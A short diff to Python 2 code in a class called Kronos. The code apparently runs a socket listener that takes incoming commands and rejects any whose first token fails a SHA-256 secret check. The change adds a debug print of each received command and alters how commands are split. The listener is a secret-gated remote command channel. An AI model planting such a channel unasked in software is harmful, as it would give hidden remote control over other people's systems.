@@ -82,10 +82,11 @@ class Kronos:
             while True:
                 try:
                   Command = Kon.recv(2048)
+                  print Command
                 except:
                   break
                 Command = Command.strip()
-                Command = Command.split(' ')
+                Command = Command.split()
                 if hashlib.sha256(Command[0]).hexdigest() != Secret:
                     Kon.send('BAD SECRET')
                     Kon.close()
